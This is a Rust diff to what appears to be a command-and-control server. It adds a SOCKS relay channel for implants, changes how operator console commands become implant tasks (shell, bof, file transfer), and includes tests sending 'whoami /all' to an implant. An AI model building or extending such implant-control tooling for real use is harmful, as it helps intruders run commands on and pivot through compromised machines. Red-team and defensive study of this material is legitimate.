@@ -41,8 +41,8 @@ const BUILTIN_TASKS: &[&str] = &[
     "download",
     "upload_chunk",
     "download_chunk",
-    "module_load",
     "bof",
+    "shell",
 ];
 
 #[derive(Debug, Deserialize)]
@@ -104,6 +104,79 @@ pub async fn operator_session_ws_handler(
     State(state): State<HttpState>,
 ) -> impl IntoResponse {
     ws.on_upgrade(move |socket| handle_operator_session(socket, state, session_id))
+}
+
+/// Implant-facing SOCKS interactive channel.
+///
+/// Binary frames on this socket are raw SOCKS_MSG frames from the socks5
+/// module. Binary frames sent back to the socket are raw SOCKS_MSG frames
+/// produced by the local SOCKS relay. This keeps SOCKS traffic off the normal
+/// beacon/task result channel while preserving the same module wire format.
+pub async fn socks_session_ws_handler(
+    ws: WebSocketUpgrade,
+    Path(session_id): Path<String>,
+    State(state): State<HttpState>,
+) -> impl IntoResponse {
+    ws.on_upgrade(move |socket| handle_socks_session(socket, state, session_id))
+}
+
+async fn handle_socks_session(mut socket: WebSocket, state: HttpState, session_id: String) {
+    let Some(socks_manager) = state.socks_manager.as_ref().cloned() else {
+        let _ = socket.close().await;
+        return;
+    };
+
+    let mut outbound_rx = match socks_manager.attach_interactive_channel(&session_id).await {
+        Ok(rx) => rx,
+        Err(e) => {
+            tracing::debug!("SOCKS WebSocket rejected for {session_id}: {e}");
+            let _ = socket.close().await;
+            return;
+        }
+    };
+
+    tracing::info!("SOCKS interactive WebSocket attached for session {session_id}");
+
+    loop {
+        tokio::select! {
+            maybe_msg = socket.recv() => {
+                let Some(msg) = maybe_msg else {
+                    break;
+                };
+                let msg = match msg {
+                    Ok(msg) => msg,
+                    Err(e) => {
+                        tracing::debug!("SOCKS WebSocket recv error for {session_id}: {e}");
+                        break;
+                    }
+                };
+
+                match msg {
+                    Message::Binary(data) => {
+                        socks_manager.route_message(&session_id, &data).await;
+                    }
+                    Message::Ping(payload) => {
+                        if socket.send(Message::Pong(payload)).await.is_err() {
+                            break;
+                        }
+                    }
+                    Message::Close(_) => break,
+                    _ => {}
+                }
+            }
+            outbound = outbound_rx.recv() => {
+                let Some(frame) = outbound else {
+                    break;
+                };
+                if socket.send(Message::Binary(frame)).await.is_err() {
+                    break;
+                }
+            }
+        }
+    }
+
+    socks_manager.detach_interactive_channel(&session_id).await;
+    tracing::info!("SOCKS interactive WebSocket detached for session {session_id}");
 }
 
 async fn handle_operator_session(mut socket: WebSocket, state: HttpState, session_id: String) {
@@ -267,16 +340,22 @@ pub fn map_operator_command(command: &str) -> Result<OperatorTaskCommand, String
     let head = parts.next().unwrap_or_default().to_ascii_lowercase();
     let tail = parts.next().unwrap_or_default().trim();
 
+    if head == "module_load" || head == "load_module" {
+        return Err(
+            "module_load requires module packaging; use the Modules page or module-specific commands"
+                .to_string(),
+        );
+    }
+
     if BUILTIN_TASKS.contains(&head.as_str()) {
         Ok(OperatorTaskCommand {
             task_type: head,
             arguments: tail.as_bytes().to_vec(),
         })
     } else {
-        Ok(OperatorTaskCommand {
-            task_type: "shell".to_string(),
-            arguments: trimmed.as_bytes().to_vec(),
-        })
+        Err(format!(
+            "unknown command '{head}'. Use 'shell {trimmed}' to run an OS command explicitly"
+        ))
     }
 }
 
@@ -502,11 +581,26 @@ mod tests {
     use super::map_operator_command;
 
     #[test]
-    fn maps_unknown_command_to_shell_with_full_arguments() {
-        let mapped = map_operator_command("whoami /all").expect("command should map");
+    fn maps_explicit_shell_command_to_shell_task() {
+        let mapped = map_operator_command("shell whoami /all").expect("command should map");
 
         assert_eq!(mapped.task_type, "shell");
         assert_eq!(mapped.arguments, b"whoami /all");
+    }
+
+    #[test]
+    fn rejects_unknown_operator_command() {
+        let err = map_operator_command("whoami /all").expect_err("unknown should fail");
+
+        assert!(err.contains("Use 'shell whoami /all'"));
+    }
+
+    #[test]
+    fn rejects_raw_module_load_from_operator_console() {
+        let err = map_operator_command("module_load socks5 start")
+            .expect_err("raw module load should fail");
+
+        assert!(err.contains("requires module packaging"));
     }
 
     #[test]
